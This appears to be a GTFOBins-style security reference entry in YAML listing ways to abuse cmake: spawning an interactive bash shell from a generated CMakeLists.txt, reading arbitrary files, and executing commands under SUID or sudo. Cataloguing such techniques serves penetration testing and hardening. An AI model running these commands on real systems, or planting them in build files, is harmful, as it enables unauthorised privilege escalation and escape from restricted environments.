---
functions:
  shell:
    - description: It can be used to break out from a restricted environment by spawning an interactive system shell.
      code: |
        echo "execute_process(COMMAND bash -i)" > CMakeLists.txt
        cmake .
  file-read:
    - description: It can read files, and may be used to perform privileged reads or discloe files outside a restrited file system
      code: |
        LFILE=file_to_read
        cmake -E cat $LFILE

  limited-suid:
    - description: It can perform execution in a privileged context, given the SUID bit is set
      code: |
        echo "execute_process(COMMAND whoami)" > CMakeLists.txt
        cmake .
  sudo:
    - description: It can perform execution in a privileged context, given the user can run the binary with sudo
      code: |
        echo "execute_process(COMMAND bash -i)" > CMakeLists.txt
        sudo cmake .
---